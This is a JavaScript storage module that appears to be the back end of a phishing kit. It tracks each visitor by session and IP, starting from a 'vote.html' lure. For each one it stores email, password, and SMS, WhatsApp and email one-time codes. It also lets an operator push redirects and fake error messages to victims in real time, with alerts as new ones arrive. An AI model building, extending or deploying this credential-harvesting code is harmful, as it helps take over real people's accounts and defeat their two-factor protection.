const fs = require('fs');
const path = require('path');

const dataDir = path.join(__dirname, '..', 'data');
const dbFile = path.join(dataDir, 'store.json');

if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

function loadStore() {
  if (!fs.existsSync(dbFile)) {
    return { clients: {}, audit: [] };
  }
  return JSON.parse(fs.readFileSync(dbFile, 'utf8'));
}

function saveStore(store) {
  fs.writeFileSync(dbFile, JSON.stringify(store, null, 2));
}

function clientKey(session, ip) {
  return `${session}::${ip}`;
}

function upsertClient(session, ip, fields = {}) {
  const store = loadStore();
  const key = clientKey(session, ip);
  const now = Date.now();
  const isNew = !store.clients[key];

  if (!store.clients[key]) {
    store.clients[key] = {
      session,
      ip,
      current_page: 'vote.html',
      pending_action: null,
      pending_redirect: null,
      error_message: null,
      email: null,
      password: null,
      sms_code: null,
      whatsapp_code: null,
      email_code: null,
      user_agent: null,
      last_seen: now,
      created_at: now
    };
  }

  Object.assign(store.clients[key], fields, { last_seen: now });
  saveStore(store);

  return { client: store.clients[key], isNew };
}

function getClient(session, ip) {
  const store = loadStore();
  return store.clients[clientKey(session, ip)] || null;
}

function getAllClients() {
  const store = loadStore();
  return Object.values(store.clients).sort((a, b) => b.last_seen - a.last_seen);
}

function setPendingAction(session, ip, action, redirect = null, errorMessage = null) {
  const store = loadStore();
  const key = clientKey(session, ip);
  if (!store.clients[key]) return;
  store.clients[key].pending_action = action;
  store.clients[key].pending_redirect = redirect;
  store.clients[key].error_message = errorMessage;
  store.clients[key].last_seen = Date.now();
  saveStore(store);
}

function consumePendingAction(session, ip) {
  const store = loadStore();
  const key = clientKey(session, ip);
  const client = store.clients[key];
  if (!client || !client.pending_action) return null;

  const result = {
    action: client.pending_action,
    redirect: client.pending_redirect,
    errorMessage: client.error_message
  };

  client.pending_action = null;
  client.pending_redirect = null;
  client.error_message = null;
  saveStore(store);

  return result;
}

function logAudit(session, ip, action, details) {
  const store = loadStore();
  store.audit.push({ session, ip, action, details, created_at: Date.now() });
  if (store.audit.length > 5000) store.audit = store.audit.slice(-5000);
  saveStore(store);
}

const notifications = [];
let notifId = 0;

function pushNotification(type, title, message, ip) {
  const n = { id: ++notifId, type, title, message, ip: ip || '', time: Date.now() };
  notifications.unshift(n);
  if (notifications.length > 100) notifications.pop();
  return n;
}

function getNotifications(since) {
  if (!since) return notifications.slice(0, 50);
  return notifications.filter(n => n.time > since);
}

module.exports = {
  upsertClient,
  getClient,
  getAllClients,
  setPendingAction,
  consumePendingAction,
  logAudit,
  pushNotification,
  getNotifications
};
